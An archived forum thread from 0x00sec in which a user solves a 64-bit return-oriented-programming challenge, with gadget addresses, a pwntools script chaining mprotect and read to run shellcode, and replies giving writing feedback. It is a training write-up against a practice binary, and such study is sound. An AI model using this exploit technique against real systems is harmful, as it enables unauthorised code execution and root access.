<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>64-bit ROP | You rule &#39;em all! - Exploit Development - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="Solving a ROP on 64-bit challenge :grinning:

In the name of Allah, the most beneficent, the most merciful. 

###Before i begin this article, i want to thank @_py for showing me this beautiful community :yum:‚Ä¶ 

This art&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="1937.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;64-bit ROP | You rule &#39;em all!&#39;" href="1937.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/2X/b/b21c8591e3150488218f1e3c0bd1f96f0e55ff23.png" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/2X/b/b21c8591e3150488218f1e3c0bd1f96f0e55ff23.png" />
<meta property="og:url" content="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937" />
<meta name="twitter:url" content="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937" />
<meta property="og:title" content="64-bit ROP | You rule &#39;em all!" />
<meta name="twitter:title" content="64-bit ROP | You rule &#39;em all!" />
<meta property="og:description" content="Solving a ROP on 64-bit challenge üòÄ  In the name of Allah, the most beneficent, the most merciful.   ###Before i begin this article, i want to thank @_py for showing me this beautiful community üòã‚Ä¶   This article is for learning purposes‚Ä¶ üôÇ  Hello everybody, this my first article ever, i‚Äôm not really good at explaining things‚Ä¶ But still, i will try making everything clear for you‚Ä¶ So in this task we were given a binary, and its source code‚Ä¶ So the first thing is that we ..." />
<meta name="twitter:description" content="Solving a ROP on 64-bit challenge üòÄ  In the name of Allah, the most beneficent, the most merciful.   ###Before i begin this article, i want to thank @_py for showing me this beautiful community üòã‚Ä¶   This article is for learning purposes‚Ä¶ üôÇ  Hello everybody, this my first article ever, i‚Äôm not really good at explaining things‚Ä¶ But still, i will try making everything clear for you‚Ä¶ So in this task we were given a binary, and its source code‚Ä¶ So the first thing is that we ..." />
<meta property="og:article:section" content="Exploit Development" />
<meta property="og:article:section:color" content="92278F" />
<meta property="og:article:tag" content="linux" />
<meta property="og:article:tag" content="rop" />
<meta property="og:article:tag" content="pwning" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="5 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="55 ‚ù§" />
<meta property="article:published_time" content="2017-04-27T19:36:03+00:00" />
<meta property="og:ignore_canonical" content="true" />
<link rel="next" href="1937%3Fpage=2.html">
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="1937.html">64-bit ROP | You rule &#39;em all!</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/exploit-development.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #92278F"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Exploit Development</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/linux.html" class="discourse-tag" rel="tag">linux</a>,
<a href="../../tag/rop.html" class="discourse-tag" rel="tag">rop</a>,
<a href="../../tag/pwning.html" class="discourse-tag" rel="tag">pwning</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="64-bit ROP | You rule &#39;em all!">
<meta itemprop="articleSection" content="Exploit Development">
<meta itemprop="keywords" content="linux, rop, pwning">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/exploit"><span itemprop="name">exploit</span></a>
(exploit)
</span>
<link itemprop="mainEntityOfPage" href="1937.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/b/b21c8591e3150488218f1e3c0bd1f96f0e55ff23.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-04-27T19:36:03Z" class="post-time">
April 27, 2017, 7:36pm
</time>
<meta itemprop="dateModified" content="2017-04-27T19:53:22Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<h3>Solving a ROP on 64-bit challenge <img src="../../images/emoji/twitter/grinning.png%3Fv=9" title=":grinning:" class="emoji" alt=":grinning:">
</h3>
<p>In the name of Allah, the most beneficent, the most merciful.</p>
<hr>
<p>##<span class="hashtag">#Before</span> i begin this article, i want to thank <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> for showing me this beautiful community <img src="../../images/emoji/twitter/yum.png%3Fv=9" title=":yum:" class="emoji" alt=":yum:">‚Ä¶</p>
<ul>
<li>This article is for learning purposes‚Ä¶ <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">
</li>
<li>Hello everybody, this my first article ever, i‚Äôm not really good at explaining things‚Ä¶ But still, i will try making everything clear for you‚Ä¶</li>
<li>So in this task we were given a binary, and its source code‚Ä¶ So the first thing is that we should identify the bug, and try to do something with it‚Ä¶</li>
<li>Also one thing to keep in mind, the binary does read our input and print it in hexadecimal.</li>
</ul>
<p>The following lines seem interesting‚Ä¶</p>
<pre><code class="lang-auto">char buffer[256];
gets(buffer);
</code></pre>
<p>So we have an array named buffer, which size is 256.<br>
and then comes a call to gets();</p>
<blockquote>
<p>gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte (aq\0aq).</p>
</blockquote>
<aside class="onebox allowlistedgeneric">
<header class="source">
<img src="https://linux.die.net/favicon.ico" class="site-icon" width="32" height="32">
<a href="https://linux.die.net/man/3/gets" target="_blank" rel="noopener nofollow ugc">linux.die.net</a>
</header>
<article class="onebox-body">
<img "https://0x00sec.org/t/64-bit-rop-you-rule-em-all/src" class="thumbnail" width height>
<h3><a href="https://linux.die.net/man/3/gets" target="_blank" rel="noopener nofollow ugc">gets(3): input of char/strings - Linux man page</a></h3>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
<p>uhm, so it will read from stdin, until it gets newline. ‚Äú\x0a‚Äù</p>
<p>Seems just perfect. so it will take our input, and stores it in buffer, one question that comes to our mind now‚Ä¶<br>
What if the size of our input was &gt; sizeof(buffer);</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b21c8591e3150488218f1e3c0bd1f96f0e55ff23.png" width="690" height="85"></p>
<ul>
<li>The answer is that we‚Äôll overwrite the value of saved RIP.</li>
</ul>
<p>mean that we control the flow of the program‚Ä¶</p>
<p>Let‚Äôs try that in the real challenge now‚Ä¶</p>
<p>Let‚Äôs first download the binary‚Ä¶</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/ab6e395b666a1a342f3167b8f194a4213519e178.png" width="690" height="207"></p>
<p>Then let‚Äôs try to do what we talked about, making the size of input bigger than the size of the array:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d4b602a20b809d21c04df0a23b3685c3bfffc9c2.png" width="690" height="160"></p>
<p>Interesting, we got Segmentation fault, which is actually a signal‚Ä¶</p>
<blockquote>
<p>In computing, a segmentation fault (often shortened to segfault) or access violation is a fault, or failure condition, raised by hardware with memory protection, notifying an operating system (OS) the software has attempted to access a restricted area of memory (a memory access violation).</p>
</blockquote>
<p>So we can deduce that the RIP pointed to 0x41414141 and tried reading the instuction from that invalid address leading into this‚Ä¶</p>
<p>Awesome! but the question now, is what pad should we use till we reach the RIP saved address‚Ä¶ what we should do is decrementing till it exits normally and add one, that‚Äôs the perfect padding‚Ä¶</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c538d09948896aeb60154aee619bd2ef36a48f39.png" width="690" height="269"></p>
<p>Seems good, so the perfect pad to saved RIP is 280!<br>
let‚Äôs make sure it‚Äôs the right pad‚Ä¶</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a5232793128dcbd6c2d873a3ece38d5db06f9422.png" width="677" height="91"><br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e006e89d361c0e3af0ca40cd7d183f039eda0421.png" width="309" height="57"></p>
<p>And that‚Äôs just what we were looking for‚Ä¶ Perfect!</p>
<p>Now what to do? we got control over RIP, what‚Äôs next?</p>
<p>The next thing is to find gadgets, that‚Äôll help us get shell in some way‚Ä¶</p>
<p>To do this, you can use multiple tools, i use Ropper! a really great tool to search for gadgets ending with a ret; so it just won‚Äôt exit, instead, calls the following address.</p>
<p>This challenge, has the following protections on:<br>
<code>FULL RELRO NX ASLR</code></p>
<p>But, we have a more powerful thing, is that we have control over RIP‚Ä¶ and we got alot of gadgets, since the binary is statically linked‚Ä¶</p>
<p>So now, we should make a plan for the attack‚Ä¶<br>
what can we do to get a shell?</p>
<p>The first thing that comes to mind, is making an area in memory [executable, writeable, readable] (RWX), and put shellcode into it, and simply return to it‚Ä¶</p>
<p>To do this, we first got to understand the usage of some functions, like mprotect(), and read()‚Ä¶</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3a0ff54d4f4627ea930b31383b6558fede053b1d.png" width="408" height="195"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0c75847799ded4eae24fa97180f728b4c6506701.png" width="404" height="126"></p>
<p>And we can see that both function, take 3 arguments‚Ä¶ And make use of them!</p>
<p>So let‚Äôs see the binary, and write what we will be doing!</p>
<blockquote>
<p>1ST : mprotect() an area, making it RWX!<br>
2ND : read() our shellcode from stdin ( fd = 0 ) into the area we made executable.<br>
3RD : return to the area.</p>
</blockquote>
<p>So let‚Äôs look for a good address to make it‚Äôs permissions RWX!</p>
<ul>
<li>We‚Äôll be using vmmap in gdb-peda to see the areas.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9a60f5f5f0abedb102fe1e72947af5aeab9d298f.png" width="673" height="204">
</li>
</ul>
<p>Uhmm!</p>
<ul>
<li>We‚Äôll choose 0x6bf000 !</li>
</ul>
<p>So our usage of mprotect() will be like the following:<br>
<code>mprotect(0x6bf000(*addr), 0x100(len), PROT_READ|PROT_WRITE|PROT_EXEC(prot));</code><br>
And our usage of read():<br>
<code>read(stdin(fd=0), 0x6bf000(*buf), 0x100(len));</code></p>
<p>Now, what gadgets can help us invoke the following calls?</p>
<p>We‚Äôll use ropper to get the gadgets!<br>
<aside class="onebox allowlistedgeneric">
<header class="source">
<img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
<a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener nofollow ugc">GitHub</a>
</header>
<article class="onebox-body">
<img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d6b82f4121c1873ab805c30ffd61af2b322e6137.jpeg" class="thumbnail onebox-avatar" width="197" height="197">
<h3><a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener nofollow ugc">sashs/Ropper</a></h3>
<p>Display information about files in different file formats and find gadgets to build rop chains for different architectures (x86/x86_64, ARM/ARM64, MIPS, PowerPC, SPARC64). For disassembly ropper us...</p>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
<br>
Let‚Äôs try and use ropper!</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d4374f8214658316284049caa7d957a33edb260f.png" width="667" height="68"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/ac787f32dbeff2bf4eb25e54461294bfb9f2014f.png" width="642" height="56"></p>
<p>And that will give you all gadgets, will take some time to load‚Ä¶</p>
<p>let‚Äôs find the gadgets that interests us!</p>
<p>syscall; ret; ( invoking the syscall )<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3dcbde4b22e4a5774d4fd305e2d339605ddbf27e.png" width="330" height="25"><br>
pop rax; ret; ( syscall number )<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5306c9a4e67539e0097a98823e9974a68eb0db06.png" width="307" height="21"><br>
pop rdi; ret; ( 1st argument )<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cd1b57b7e80c79e1f4f2c99d6be474f75418044b.png" width="316" height="24"><br>
pop rsi; ret; ( 2nd argument )<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/1/14531bf4c66d7088355e6819e7454285ff315e99.png" width="313" height="24"><br>
pop rdx; ret; ( 3rd argument )<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b309f8bd02f0c21d97ef806c4743a6d196a18c82.png" width="301" height="25"></p>
<p>So now we have the gadgets, enough to invoke a call!</p>
<p>We will also make use of this table:</p>
<aside class="onebox allowlistedgeneric">
<header class="source">
<a href="https://filippo.io/linux-syscall-table/" target="_blank" rel="noopener nofollow ugc">filippo.io</a>
</header>
<article class="onebox-body">
<img "https://0x00sec.org/t/64-bit-rop-you-rule-em-all/src" class="thumbnail" width height>
<h3><a href="https://filippo.io/linux-syscall-table/" target="_blank" rel="noopener nofollow ugc">Searchable Linux Syscall Table for x86 and x86_64 | PyTux</a></h3>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
<p>And we get syscall numbers for read() and mprotect()</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c80729e255c8255aab15ad42b060e7322d75c38b.png" width="690" height="392"></p>
<ul>
<li>So for mprotect() we should set RAX to 0xa and for read() RAX should be set to 0x0</li>
</ul>
<p>Now we‚Äôve reached a part, where a problem becomes obvious. 0xa, is a newline char, sending it will corrupt our payload‚Ä¶<br>
So we gotta find another way to control RAX, zeroing it out, using xor, and then increment it using add!</p>
<p>Gadgets that‚Äôll help us do this:<br>
xor rax with itself, resulting in RAX = 0; and ret;<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e447c84c20d3e363ed7af02dc261123626b82702.png" width="351" height="20"><br>
increment RAX!<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2c4ab09dc2f9f309d82139acc47d65926c46a05a.png" width="332" height="23"></p>
<p>So now to making the exploit we‚Äôll start with putting what we already know there:</p>
<pre><code class="lang-python">#!/usr/bin/python
from pwn import *

c = process("./ch34")

# GADGETS
xorrax = 0x41bd9f
incrax = 0x45aa10
poprdi = 0x4016d3
poprsi = 0x4017e7
poprdx = 0x437205
syscall = 0x45b525
# ADDR
buf = 0x6bf000
# SYSCALL NUMS
mprotect = 0xa
read = 0x0

# EXPLOIT
payload = "A" * 280

# SENDING
c.sendline(payload)
c.interactive()
</code></pre>
<p>If we pop a register then the next address will be assigned to it as a value‚Ä¶</p>
<p>So let‚Äôs try to make use of the gadgets we found!<br>
we‚Äôll only modify the # EXPLOIT section in the exploit‚Ä¶</p>
<pre><code class="lang-python"># EXPLOIT
payload = "A" * 280
payload += p64(xorrax) # SET RAX = 0
payload += p64(incrax) * 10 # SET RAX = 10
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/95446560f87db043c09f0488d49e352fe27a4316.png" width="151" height="29"></p>
<p>And it worked! we can now continue with other registers!</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c9583aa6058ed368f3a48b533c55e30c4da7a703.png" width="610" height="340"></p>
<pre><code class="lang-python"># EXPLOIT
payload = "A" * 280
payload += p64(xorrax) # SET RAX = 0
payload += p64(incrax) * 10 # SET RAX = 10
payload += p64(poprdi) # 1ST ARGUMENT
payload += p64(buf) # ADDRESS
payload += p64(poprsi) # 2ND ARGUMENT
payload += p64(0x100) # SIZE
payload += p64(poprdx) # 3RD ARGUMENT
payload += p64(0x7) # RWX
payload += p64(syscall) # SYSCALL
</code></pre>
<p>Let‚Äôs try and see now, if our area is executable! <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cd55c51b93759c4fe3f023549a46fe9cafcfa527.png" width="675" height="21"></p>
<p>That‚Äôs awesome! the area have now RWX permissions!</p>
<p>What do we need to do now?<br>
We need to read the shellcode from stdin and place it in the executable area!</p>
<pre><code class="lang-python"># EXPLOIT
payload = "A" * 280
payload += p64(xorrax) # SET RAX = 0
payload += p64(incrax) * 10 # SET RAX = 10
payload += p64(poprdi) # 1ST ARGUMENT
payload += p64(buf) # ADDRESS
payload += p64(poprsi) # 2ND ARGUMENT
payload += p64(0x100) # SIZE
payload += p64(poprdx) # 3RD ARGUMENT
payload += p64(0x7) # RWX
payload += p64(syscall) # SYSCALL
payload += p64(xorrax) # SET RAX = 0
payload += p64(poprdi) # 1ST ARGUMENT
payload += p64(0x0) # STDIN
payload += p64(poprsi) # 2ND ARGUMENT
payload += p64(buf) # ADDRESS
payload += p64(poprdx) # 3RD ARGUMENT
payload += p64(0x100) # SIZE
payload += p64(syscall) # SYSCALL
</code></pre>
<p>And that will be enough to invoke a mprotect() to make the area executable and then read() shellcode from stdin ( fd = 0 ) but still we didn‚Äôt do one thing, is returning to shellcode!</p>
<p>To do it, we need to add one line! remember it‚Äôs syscall; ret;<br>
So we need to add:</p>
<blockquote>
<p>payload += p64(buf)</p>
</blockquote>
<p>And also, since it‚Äôll read the shellcode from stdin, we‚Äôll add a variable named shellcode containing a x86_64 shellcode‚Ä¶<br>
and send it right after:</p>
<pre><code class="lang-python">c.sendline(payload)
c.sendline(shellcode)
</code></pre>
<ul>
<li>And i think that‚Äôs enough to come with a shell!</li>
</ul>
<p>Time to try!</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3d38ca9b64de8abef9b35ae5c6fe4fc695881ada.png" width="690" height="260"></p>
<p>And we successfully got our lovely shell!<br>
to exploit now on remote, and i‚Äôm a windows user‚Ä¶ we got to take our payload and change it‚Äôs form‚Ä¶</p>
<ul>
<li>Write payload to a file and take it out of my VM‚Ä¶</li>
<li>Write a little php script to make it in the form i want‚Ä¶</li>
</ul>
<pre><code class="lang-php">&lt;?php
error_reporting(0);
$c = file_get_contents('payload');
for($i = 0; $i &lt; strlen($c); $i++){
$a = $c[$i];
$h = base_convert(ord($a), 10, 16);
if(strlen($h) &lt; 2){
$p = "0";
}else{
$p = "";
}
$n .= "\x".$p.$h;
}
print $n;
?&gt;
</code></pre>
<p>And that will give us the payload in the following form:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/d/ddb391f79e9dc64ace5b8debf52e6cc573d5dc0d.png" width="690" height="21"></p>
<p>So we can use it: (python -c ‚Äòprint ‚Äú(payload here)‚Äù‚Äô; python -c ‚Äòprint ‚Äú(shellcode here)‚Äù‚Äô; cat) | ./ch34</p>
<p>after doing so!<br>
We failed‚Ä¶<br>
We got a shell, but no root permissions!</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cf0d874ba4e6afa00e5df306b90d5fd692ff9321.png" width="690" height="45"></p>
<p>What about an setuid(0); and then execve(‚Äô/bin/sh‚Äô); shellcode?</p>
<p><aside class="onebox allowlistedgeneric">
<header class="source">
<a href="http://shell-storm.org/shellcode/files/shellcode-77.php" target="_blank" rel="noopener nofollow ugc">shell-storm.org</a>
</header>
<article class="onebox-body">
<img "https://0x00sec.org/t/64-bit-rop-you-rule-em-all/src" class="thumbnail" width height>
<h3><a href="http://shell-storm.org/shellcode/files/shellcode-77.php" target="_blank" rel="noopener nofollow ugc">Linux/x86-64 - setuid(0) + execve(/bin/sh) 49 bytes</a></h3>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
<br>
And yeah! it worked‚Ä¶</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0d596e0a1751e107a7406fa6f46c8b3165deeed7.png" width="690" height="31"></p>
<p>We successfully exploited it using Return oriented programming!<br>
Hope you understood well, and enjoyed reading as well!<br>
If people like such simple articles, i‚Äôll try making more later! <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<p>~ exploit</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="22" />
<span class="post-likes">22 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../pwnable-stacky-jumpy/3302/7.html">[Pwnable] Stacky Jumpy</a>
<meta itemprop="position" content="5">
</div>
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/VVid0w"><span itemprop="name">VVid0w</span></a>
(H@x0r1ng M@573r)
</span>
<link itemprop="mainEntityOfPage" href="1937.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-04-27T22:14:23Z" class="post-time">
April 27, 2017, 10:14pm
</time>
<meta itemprop="dateModified" content="2017-04-27T22:14:23Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I learned quite a bit from your article! Although I do recommend that you add in a little bit of theory; like what is ROP, what‚Äôs RIP, what‚Äôs a ‚Äúbuffer‚Äù, and what‚Äôs the difference between 64-bit ROP &amp; 32-bit ROP (If there is difference. If there‚Äôs a whole plethora of differences, then perhaps make another article explaining that?) to the beginning of your article and use more horizontal-rules so people can differentiate between sections easier.</p>
<p>Also, I understand that English may not be your native language but you may want to check up on a few spelling mistakes.</p>
<p>I‚Äôm glad that you wrote this article though! Keep on writing and you‚Äôll get better with each and every one. I would like to say again that I did learn <em>quite</em> a lot from you! You did a pretty good job with this and explained things quite well.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="4" />
<span class="post-likes">4 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/exploit"><span itemprop="name">exploit</span></a>
(exploit)
</span>
<link itemprop="mainEntityOfPage" href="1937.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-04-27T22:19:24Z" class="post-time">
April 27, 2017, 10:19pm
</time>
<meta itemprop="dateModified" content="2017-04-27T22:19:24Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thank you for this reply, in the next articles, i‚Äôll try making my english better, and even go for explaining things more deeply, like you said, and i think you are right, <img src="../../images/emoji/twitter/smile.png%3Fv=9" title=":smile:" class="emoji" alt=":smile:">! Again, thank you for a such reply <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:">! Also i‚Äôm really happy you learned from this article! <img src="../../images/emoji/twitter/heart_eyes.png%3Fv=9" title=":heart_eyes:" class="emoji" alt=":heart_eyes:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/ricksanchez"><span itemprop="name">ricksanchez</span></a>
</span>
<link itemprop="mainEntityOfPage" href="1937.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-04-28T08:40:42Z" class="post-time">
April 28, 2017, 8:40am
</time>
<meta itemprop="dateModified" content="2017-04-28T08:40:42Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p><a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a> really solid first article. I can agree with what <a class="mention" href="https://0x00sec.org/u/vvid0w">@VVid0w</a> said for feedback.<br>
Keep them coming. <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"></p>
<p>In the end as a feedback in my own words I can say the following:<br>
I could follow this post quite well and enjoyed reading it for the most part. Just a few remarks:</p>
<ul>
